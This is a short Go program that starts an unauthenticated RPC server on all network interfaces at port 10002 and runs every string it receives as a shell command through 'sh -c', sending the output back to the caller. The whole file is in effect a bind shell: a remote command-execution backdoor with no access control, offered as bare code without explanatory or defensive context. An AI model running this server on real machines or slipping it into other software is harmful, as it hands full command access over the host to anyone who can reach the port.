package main

import (
	"fmt"
	"net"
	"log"
	"net/rpc"
	"os/exec"
)

type Listener int

func (l *Listener) GetLine1(line string, ack *string) error {
	fmt.Printf("RECEIVED: %s\n", line)
	cmd := exec.Command("sh", "-c", line)
	stdoutStderr, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatal(err)
	}
	*ack = string(stdoutStderr)
	//*ack = string(line)
	return nil
}

func main() {
	addy, err := net.ResolveTCPAddr("tcp", "0.0.0.0:10002")
	if err != nil {
		log.Fatal(err)
	}

	inbound, err := net.ListenTCP("tcp", addy)
	if err != nil {
		log.Fatal(err)
	}

	listener := new(Listener)
	rpc.Register(listener)
	rpc.Accept(inbound)
}